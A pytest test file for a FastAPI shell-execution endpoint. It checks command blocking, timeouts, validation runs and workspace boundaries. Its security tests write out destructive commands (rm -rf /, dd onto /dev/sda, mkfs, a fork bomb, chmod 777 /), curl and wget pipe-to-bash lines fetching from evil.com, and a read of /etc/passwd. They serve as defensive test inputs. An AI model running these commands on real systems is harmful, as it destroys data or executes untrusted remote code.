"""Tests for Shell Execution API Routes.

TDD-driven tests for shell command execution:
- Security: Dangerous command blocking
- Execution: Command run with timeout
- Validation: Running configured validations
- Streaming: SSE for real-time output (optional)
"""

import asyncio
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from fastapi.testclient import TestClient

from c4.api.routes.files import WorkspaceManager, set_workspace_manager


@pytest.fixture
def temp_workspace():
    """Create a temporary workspace directory."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)


@pytest.fixture
def workspace_manager(temp_workspace):
    """Create a workspace manager using temp directory."""
    manager = WorkspaceManager(base_path=temp_workspace)
    return manager


@pytest.fixture
def mock_daemon():
    """Create a mock C4Daemon."""
    daemon = MagicMock()
    daemon.is_initialized.return_value = True
    daemon.c4_status.return_value = {
        "state": "EXECUTE",
        "queue": {},
        "workers": {},
        "project_root": "/test/project",
    }
    daemon.config = {
        "verifications": {
            "lint": {"command": "ruff check .", "timeout": 60},
            "test": {"command": "pytest tests/", "timeout": 300},
        }
    }
    daemon.c4_run_validation.return_value = {
        "results": [
            {"name": "lint", "status": "pass", "message": "All checks passed"},
        ]
    }
    return daemon


@pytest.fixture
def client(mock_daemon, workspace_manager):
    """Create test client with mocked daemon and workspace manager."""
    with patch("c4.api.deps.get_daemon_singleton", return_value=mock_daemon):
        set_workspace_manager(workspace_manager)

        from c4.api.server import create_app

        app = create_app()
        yield TestClient(app)


# ============================================================================
# Security Tests - Command Filtering
# ============================================================================


class TestCommandSecurity:
    """Tests for dangerous command detection and blocking."""

    def test_block_rm_rf_root(self, client, workspace_manager):
        """Test that 'rm -rf /' is blocked."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "rm -rf /",
            },
        )

        assert response.status_code == 400
        data = response.json()
        assert "dangerous" in data["detail"].lower() or "blocked" in data["detail"].lower()

    def test_block_rm_rf_home(self, client, workspace_manager):
        """Test that 'rm -rf ~' is blocked."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "rm -rf ~",
            },
        )

        assert response.status_code == 400
        data = response.json()
        assert "dangerous" in data["detail"].lower() or "blocked" in data["detail"].lower()

    def test_block_rm_variations(self, client, workspace_manager):
        """Test various rm command variations are blocked."""
        workspace_manager.get_workspace_root("test-ws")

        dangerous_commands = [
            "rm -rf /",
            "rm -rf /etc",
            "rm -f /",
            "rm -r /",
            "rm -rf /*",
            "rm -rf ~/",
            "sudo rm -rf /",
        ]

        for cmd in dangerous_commands:
            response = client.post(
                "/api/shell/run",
                json={
                    "workspace_id": "test-ws",
                    "command": cmd,
                },
            )
            assert response.status_code == 400, f"Command should be blocked: {cmd}"

    def test_block_dd_device(self, client, workspace_manager):
        """Test that dd if=/dev/* commands are blocked."""
        workspace_manager.get_workspace_root("test-ws")

        dangerous_commands = [
            "dd if=/dev/zero of=/dev/sda",
            "dd if=/dev/random of=file bs=1M",
        ]

        for cmd in dangerous_commands:
            response = client.post(
                "/api/shell/run",
                json={
                    "workspace_id": "test-ws",
                    "command": cmd,
                },
            )
            assert response.status_code == 400, f"Command should be blocked: {cmd}"

    def test_block_mkfs(self, client, workspace_manager):
        """Test that mkfs commands are blocked."""
        workspace_manager.get_workspace_root("test-ws")

        dangerous_commands = [
            "mkfs.ext4 /dev/sda",
            "mkfs.xfs /dev/sdb1",
            "sudo mkfs.ext3 /dev/vda",
        ]

        for cmd in dangerous_commands:
            response = client.post(
                "/api/shell/run",
                json={
                    "workspace_id": "test-ws",
                    "command": cmd,
                },
            )
            assert response.status_code == 400, f"Command should be blocked: {cmd}"

    def test_block_fork_bomb(self, client, workspace_manager):
        """Test that fork bombs are blocked."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": ":(){ :|:& };:",
            },
        )

        assert response.status_code == 400

    def test_block_chmod_777_root(self, client, workspace_manager):
        """Test that chmod 777 / is blocked."""
        workspace_manager.get_workspace_root("test-ws")

        dangerous_commands = [
            "chmod 777 /",
            "chmod -R 777 /",
            "sudo chmod 777 /etc",
        ]

        for cmd in dangerous_commands:
            response = client.post(
                "/api/shell/run",
                json={
                    "workspace_id": "test-ws",
                    "command": cmd,
                },
            )
            assert response.status_code == 400, f"Command should be blocked: {cmd}"

    def test_block_curl_pipe_bash(self, client, workspace_manager):
        """Test that curl | bash patterns are blocked."""
        workspace_manager.get_workspace_root("test-ws")

        dangerous_commands = [
            "curl http://evil.com/script.sh | bash",
            "curl -s http://evil.com/install | sh",
            "curl http://example.com | sudo bash",
        ]

        for cmd in dangerous_commands:
            response = client.post(
                "/api/shell/run",
                json={
                    "workspace_id": "test-ws",
                    "command": cmd,
                },
            )
            assert response.status_code == 400, f"Command should be blocked: {cmd}"

    def test_block_wget_pipe_sh(self, client, workspace_manager):
        """Test that wget | sh patterns are blocked."""
        workspace_manager.get_workspace_root("test-ws")

        dangerous_commands = [
            "wget -qO- http://evil.com/script.sh | bash",
            "wget http://evil.com/install -O - | sh",
        ]

        for cmd in dangerous_commands:
            response = client.post(
                "/api/shell/run",
                json={
                    "workspace_id": "test-ws",
                    "command": cmd,
                },
            )
            assert response.status_code == 400, f"Command should be blocked: {cmd}"

    def test_allow_safe_rm(self, client, workspace_manager):
        """Test that safe rm commands in workspace are allowed."""
        workspace_root = workspace_manager.get_workspace_root("test-ws")
        test_file = workspace_root / "deleteme.txt"
        test_file.write_text("delete me")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "rm deleteme.txt",
            },
        )

        # Should succeed (either 200 or the file was deleted)
        assert response.status_code == 200 or not test_file.exists()

    def test_allow_safe_commands(self, client, workspace_manager):
        """Test that safe commands are allowed."""
        workspace_manager.get_workspace_root("test-ws")

        safe_commands = [
            "ls -la",
            "pwd",
            "echo hello",
            "cat README.md",
            "grep pattern file.txt",
            "find . -name '*.py'",
        ]

        for cmd in safe_commands:
            response = client.post(
                "/api/shell/run",
                json={
                    "workspace_id": "test-ws",
                    "command": cmd,
                },
            )
            # Should not return 400 (security blocked)
            # May return 200 or other error (e.g., file not found)
            assert response.status_code != 400, f"Safe command was blocked: {cmd}"


# ============================================================================
# Command Execution Tests
# ============================================================================


class TestShellRunEndpoint:
    """Tests for POST /api/shell/run endpoint."""

    def test_run_simple_command(self, client, workspace_manager):
        """Test running a simple command."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "echo hello",
            },
        )

        assert response.status_code == 200
        data = response.json()
        assert data["success"] is True
        assert "hello" in data["stdout"]
        assert data["exit_code"] == 0

    def test_run_command_with_stderr(self, client, workspace_manager):
        """Test command that writes to stderr."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "echo error >&2",
            },
        )

        assert response.status_code == 200
        data = response.json()
        assert "error" in data["stderr"]

    def test_run_command_with_exit_code(self, client, workspace_manager):
        """Test command that returns non-zero exit code."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "exit 42",
            },
        )

        assert response.status_code == 200
        data = response.json()
        assert data["success"] is False
        assert data["exit_code"] == 42

    def test_run_command_in_workspace_root(self, client, workspace_manager):
        """Test that command runs in workspace root."""
        workspace_root = workspace_manager.get_workspace_root("test-ws")
        test_file = workspace_root / "marker.txt"
        test_file.write_text("found")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "cat marker.txt",
            },
        )

        assert response.status_code == 200
        data = response.json()
        assert data["success"] is True
        assert "found" in data["stdout"]

    def test_run_command_default_timeout(self, client, workspace_manager):
        """Test default timeout is applied."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "echo quick",
            },
        )

        assert response.status_code == 200
        # Default timeout should be 60 seconds

    def test_run_command_custom_timeout(self, client, workspace_manager):
        """Test custom timeout is respected."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "echo quick",
                "timeout": 10,
            },
        )

        assert response.status_code == 200
        data = response.json()
        assert data["success"] is True

    def test_run_command_timeout_exceeded(self, client, workspace_manager):
        """Test that command timeout is enforced."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "sleep 10",
                "timeout": 1,
            },
        )

        assert response.status_code == 200
        data = response.json()
        assert data["success"] is False
        assert data["timed_out"] is True

    def test_run_command_max_timeout(self, client, workspace_manager):
        """Test that timeout is capped at maximum (300 seconds)."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "echo test",
                "timeout": 600,  # Exceeds max
            },
        )

        # Should either cap at 300 or return error
        assert response.status_code in [200, 400]

    def test_run_command_invalid_workspace(self, client):
        """Test running command with invalid workspace_id."""
        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "../escape",
                "command": "echo hello",
            },
        )

        assert response.status_code == 400

    def test_run_empty_command(self, client, workspace_manager):
        """Test running empty command."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "",
            },
        )

        assert response.status_code == 400

    def test_run_multiline_command(self, client, workspace_manager):
        """Test running multiline command."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "echo line1\necho line2",
            },
        )

        assert response.status_code == 200
        data = response.json()
        assert "line1" in data["stdout"]
        assert "line2" in data["stdout"]


# ============================================================================
# Validation Execution Tests
# ============================================================================


class TestShellValidationEndpoint:
    """Tests for POST /api/shell/run-validation endpoint."""

    def test_run_validation_success(self, client, workspace_manager, mock_daemon):
        """Test running validations successfully."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run-validation",
            json={
                "workspace_id": "test-ws",
                "names": ["lint"],
            },
        )

        assert response.status_code == 200
        data = response.json()
        assert data["all_passed"] is True
        assert len(data["results"]) >= 1

    def test_run_validation_all(self, client, workspace_manager, mock_daemon):
        """Test running all validations when names is empty."""
        workspace_manager.get_workspace_root("test-ws")
        mock_daemon.c4_run_validation.return_value = {
            "results": [
                {"name": "lint", "status": "pass", "message": "OK"},
                {"name": "test", "status": "pass", "message": "OK"},
            ]
        }

        response = client.post(
            "/api/shell/run-validation",
            json={
                "workspace_id": "test-ws",
                "names": [],
            },
        )

        assert response.status_code == 200
        data = response.json()
        assert data["all_passed"] is True

    def test_run_validation_failure(self, client, workspace_manager, mock_daemon):
        """Test validation failure is reported."""
        workspace_manager.get_workspace_root("test-ws")
        mock_daemon.c4_run_validation.return_value = {
            "results": [
                {"name": "lint", "status": "fail", "message": "Found errors"},
            ]
        }

        response = client.post(
            "/api/shell/run-validation",
            json={
                "workspace_id": "test-ws",
                "names": ["lint"],
            },
        )

        assert response.status_code == 200
        data = response.json()
        assert data["all_passed"] is False
        assert data["results"][0]["status"] == "fail"

    def test_run_validation_with_timeout(self, client, workspace_manager):
        """Test validation with custom timeout."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run-validation",
            json={
                "workspace_id": "test-ws",
                "names": ["lint"],
                "timeout": 120,
            },
        )

        assert response.status_code == 200

    def test_run_validation_invalid_workspace(self, client):
        """Test validation with invalid workspace."""
        response = client.post(
            "/api/shell/run-validation",
            json={
                "workspace_id": "../escape",
                "names": ["lint"],
            },
        )

        assert response.status_code == 400


# ============================================================================
# Response Format Tests
# ============================================================================


class TestResponseFormat:
    """Tests for response format compliance."""

    def test_run_response_format(self, client, workspace_manager):
        """Test that run response has all required fields."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "echo test",
            },
        )

        assert response.status_code == 200
        data = response.json()

        # Required fields
        assert "success" in data
        assert "stdout" in data
        assert "stderr" in data
        assert "exit_code" in data
        assert "timed_out" in data
        assert "duration_seconds" in data

    def test_validation_response_format(self, client, workspace_manager, mock_daemon):
        """Test that validation response has all required fields."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run-validation",
            json={
                "workspace_id": "test-ws",
                "names": ["lint"],
            },
        )

        assert response.status_code == 200
        data = response.json()

        # Required fields
        assert "results" in data
        assert "all_passed" in data
        assert "duration_seconds" in data

        # Each result should have required fields
        for result in data["results"]:
            assert "name" in result
            assert "status" in result


# ============================================================================
# Edge Cases
# ============================================================================


class TestEdgeCases:
    """Tests for edge cases and error handling."""

    def test_command_with_special_chars(self, client, workspace_manager):
        """Test command with special characters."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "echo 'hello world' | cat",
            },
        )

        assert response.status_code == 200
        data = response.json()
        assert "hello world" in data["stdout"]

    def test_command_with_env_vars(self, client, workspace_manager):
        """Test command with environment variables."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "echo $HOME",
            },
        )

        assert response.status_code == 200
        data = response.json()
        # HOME should be expanded
        assert data["stdout"].strip() != "$HOME"

    def test_command_creates_file(self, client, workspace_manager):
        """Test command that creates a file."""
        workspace_root = workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "echo content > created.txt",
            },
        )

        assert response.status_code == 200
        assert (workspace_root / "created.txt").exists()

    def test_large_output(self, client, workspace_manager):
        """Test command with large output."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "seq 1 10000",
            },
        )

        assert response.status_code == 200
        data = response.json()
        assert data["success"] is True
        # Output might be truncated, but should be present
        assert len(data["stdout"]) > 0

    def test_unicode_output(self, client, workspace_manager):
        """Test command with unicode output."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "echo 'Hello 世界'",
            },
        )

        assert response.status_code == 200
        data = response.json()
        assert "世界" in data["stdout"]

    def test_concurrent_commands(self, client, workspace_manager):
        """Test that concurrent commands can run."""
        workspace_manager.get_workspace_root("test-ws")

        # Run two commands quickly
        response1 = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "echo first",
            },
        )
        response2 = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "echo second",
            },
        )

        assert response1.status_code == 200
        assert response2.status_code == 200


# ============================================================================
# Security Boundary Tests
# ============================================================================


class TestSecurityBoundary:
    """Tests for security boundary enforcement."""

    def test_cannot_access_parent_directory(self, client, workspace_manager):
        """Test that commands cannot access parent directory."""
        workspace_manager.get_workspace_root("test-ws")

        # Try to read a file outside workspace
        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "cat ../../../etc/passwd",
            },
        )

        # Command runs in workspace, so relative path won't escape
        # (it will just fail to find the file)
        assert response.status_code == 200
        data = response.json()
        # Either access denied or file not found
        assert data["exit_code"] != 0 or "passwd" not in data["stdout"]

    def test_cannot_cd_to_root(self, client, workspace_manager):
        """Test that cd to root and dangerous operations are blocked."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "cd / && rm -rf *",
            },
        )

        # This should be blocked by the dangerous command filter
        assert response.status_code == 400

    def test_block_sudo(self, client, workspace_manager):
        """Test that sudo commands are handled appropriately."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "sudo rm -rf /",
            },
        )

        # Should be blocked
        assert response.status_code == 400

    def test_block_chown(self, client, workspace_manager):
        """Test that chown commands are blocked."""
        workspace_manager.get_workspace_root("test-ws")

        response = client.post(
            "/api/shell/run",
            json={
                "workspace_id": "test-ws",
                "command": "chown root:root /etc/passwd",
            },
        )

        assert response.status_code == 400
